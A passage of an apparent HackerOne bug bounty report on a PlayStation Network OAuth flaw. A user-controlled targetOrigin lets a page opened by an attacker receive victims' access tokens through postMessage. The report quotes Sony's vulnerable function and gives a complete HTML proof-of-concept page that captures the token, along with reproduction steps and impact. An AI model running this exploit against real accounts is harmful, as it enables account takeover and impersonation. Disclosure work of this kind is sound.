href=\"/redirect?url=https%3A%2F%2Fauth.api.sonyentertainmentnetwork.com%2F2.0%2Foauth%2Fauthorize%3Fresponse_type%3Dtoken%26scope%3Dcapone%253Areport_submission%252Ckamaji%253Agame_list%252Ckamaji%253Aget_account_hash%252Cuser%253Aaccount.get%252Cuser%253Aaccount.profile.get%252Ckamaji%253Asocial_get_graph%252Ckamaji%253Augc%253Adistributor%252Cuser%253Aaccount.identityMapper%252Ckamaji%253Amusic_views%252Ckamaji%253Aactivity_feed_get_feed_privacy%252Ckamaji%253Aactivity_feed_get_news_feed%252Ckamaji%253Aactivity_feed_submit_feed_story%252Ckamaji%253Aactivity_feed_internal_feed_submit_story%252Ckamaji%253Aaccount_link_token_web%252Ckamaji%253Augc%253Adistributor_web%252Ckamaji%253Aurl_preview%26client_id%3D656ace0b-d627-47e6-915c-13b259cd06b2%26redirect_uri%3Dhttps%253A%252F%252Fmy.playstation.com%252Fauth%252Fresponse.html%253FrequestID%253Diframe_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2%2526baseUrl%253D%252F%2526targetOrigin%253Dhttps%253A%252F%252Fmy.playstation.com%26prompt%3Dnone\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token\u0026amp;scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview\u0026amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2\u0026amp;redirect_uri=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Diframe_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2%26baseUrl%3D%2F%26targetOrigin%3Dhttps%3A%2F%2Fmy.playstation.com\u0026amp;prompt=none\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eto get an authorization token for corresponding scopes in the above URL. If user is already authenticated and has permission for all of the scopes, the redirection will be made to redirect_uri which is \u003ca title=\"https://my.playstation.com/auth/response.html?requestID=iframe_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2\u0026amp;baseUrl=/\u0026amp;targetOrigin=https://my.playstation.com\u0026amp;prompt=none\" href=\"/redirect?url=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Diframe_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2%26baseUrl%3D%2F%26targetOrigin%3Dhttps%3A%2F%2Fmy.playstation.com%26prompt%3Dnone\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://my.playstation.com/auth/response.html?requestID=iframe_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2\u0026amp;baseUrl=/\u0026amp;targetOrigin=https://my.playstation.com\u0026amp;prompt=none\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe request is made using an iframe and the token will be sent back via postMessage and the problem lies on how this authorization token is sent.\u003cbr\u003e\nConsider the javascript function (view source on above URL) responsible for sending token back.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efunction sendResponseToApp(a) {\n    var b = extractFrameTypeFromRequestID(a.requestID),\n        c = a.targetOrigin || getOrigin(),\n        d = a.baseUrl || \u0026quot;\u0026quot;,\n        e = a.returnRoute || \u0026quot;\u0026quot;,\n        f = a.excludeQueryParams,\n        g = !f \u0026amp;\u0026amp; window.location.search || \u0026quot;\u0026quot;;\n    switch (b) {\n        case \u0026quot;iframe\u0026quot;:\n            window.parent.postMessage(a, c);\n            break;\n        case \u0026quot;window\u0026quot;:\n            window.opener.postMessage(a, c);\n            break;\n        case \u0026quot;external\u0026quot;:\n        default:\n            var h = constructUrl(c, d, e) + g;\n            /^(https:\\/\\/)([a-z0-9\\-]+\\.)+(playstation\\.com)(:([0-9]){4})?\\//.test(h) ? window.location.href =\n                h : window.location.href = \u0026quot;https://playstation.com/error\u0026quot;\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf the requestID starts with window, the token will be sent back to window.opener instead of window.parent and targetOrigin is controlled by user via GET parameter with the same name.\u003c/p\u003e\n\n\u003cp\u003eTherefore, if the authorization endpoint is opened from a malicious page via window.open and target origin is set to * (wildcard), the token will be sent back to malicious page.\u003c/p\u003e\n\n\u003cp\u003eHere is a PoC code I wrote to demonstrate this\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!Doctype HTML\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;title\u0026gt;\u003c/span\u003ePlayStation Authorization Token Leaks via postMessage\u003cspan class=\"nt\"\u003e\u0026lt;/title\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text/javascript\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddEventListener\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eload\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003estartBtn\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddEventListener\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttps://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token\u0026amp;scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview\u0026amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2\u0026amp;redirect_uri=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Dwindow_request_57d5021b-c4d4-45ad-a8e9-99bf3cd11bb2%26baseUrl%3D%2F%26targetOrigin%3D*\u0026amp;prompt=none\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003emywindow\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonmessage\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                    \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etoken-plate\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003einnerText\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;h1\u0026gt;\u003c/span\u003ePlayStation Authorization Token Leaks via postMessage\u003cspan class=\"nt\"\u003e\u0026lt;/h1\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;startBtn\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;padding: 0.5em; font-size: 1.2em; width: 200px;\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eStart\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;token-plate\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin: 1em; padding: 1.2em; border: 1px solid #ddd;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;em\u0026gt;\u003c/span\u003eToken Plate\u003cspan class=\"nt\"\u003e\u0026lt;/em\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;footer\u0026gt;\u003c/span\u003e\n            @nnez | HackerOne\n        \u003cspan class=\"nt\"\u003e\u0026lt;/footer\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"steps-to-reproduce\"\u003eSteps to Reproduce\u003c/h1\u003e\n\n\u003cp\u003eLogin on playstation network, maybe at \u003ca title=\"https://my.playstation.com\" href=\"/redirect?url=https%3A%2F%2Fmy.playstation.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://my.playstation.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e or \u003ca title=\"https://store.playstation.com\" href=\"/redirect?url=https%3A%2F%2Fstore.playstation.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://store.playstation.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nGo to malicious page with provided code, or you can go to this PoC I hosted, \u003ca title=\"http://nnez-poc.000webhostapp.com/e1f47833ad18d94a20780d81f8060c79.html\" href=\"/redirect?url=http%3A%2F%2Fnnez-poc.000webhostapp.com%2Fe1f47833ad18d94a20780d81f8060c79.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://nnez-poc.000webhostapp.com/e1f47833ad18d94a20780d81f8060c79.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nClick on start button, after the window is opened, navigate back and you will see access token in the box.\u003c/p\u003e\n\n\u003ch1 id=\"additional-notes\"\u003eAdditional Notes\u003c/h1\u003e\n\n\u003cp\u003eThis also happened on other endpoints with the same code base such as\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://social.playstation.com/starblaster2/pdc/master/auth/response-6bd54237a5ffea223e2784fcd88c34e1.html?requestID=iframe_request_f179f207-79d8-4659-b1d4-f85e6c57a212\u0026amp;baseUrl=/starblaster2/pdc/master/\u0026amp;targetOrigin=https://store.playstation.com\" href=\"/redirect?url=https%3A%2F%2Fsocial.playstation.com%2Fstarblaster2%2Fpdc%2Fmaster%2Fauth%2Fresponse-6bd54237a5ffea223e2784fcd88c34e1.html%3FrequestID%3Diframe_request_f179f207-79d8-4659-b1d4-f85e6c57a212%26baseUrl%3D%2Fstarblaster2%2Fpdc%2Fmaster%2F%26targetOrigin%3Dhttps%3A%2F%2Fstore.playstation.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://social.playstation.com/starblaster2/pdc/master/auth/response-6bd54237a5ffea223e2784fcd88c34e1.html?requestID=iframe_request_f179f207-79d8-4659-b1d4-f85e6c57a212\u0026amp;baseUrl=/starblaster2/pdc/master/\u0026amp;targetOrigin=https://store.playstation.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003ebut with different range of permission scopes.\u003c/p\u003e\n\n\u003ch1 id=\"impact\"\u003eImpact\u003c/h1\u003e\n\n\u003cp\u003eAn authorization token on my.playstation.com would allow an attacker to impersonate as a victim, access to sensitive information, post on victim news feed\u003cbr\u003e\nAn authorization token on social.playstation.com would allow an attacker to impersonate as a victim, access to friends list and chat with victim\u0026#39;s friends.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}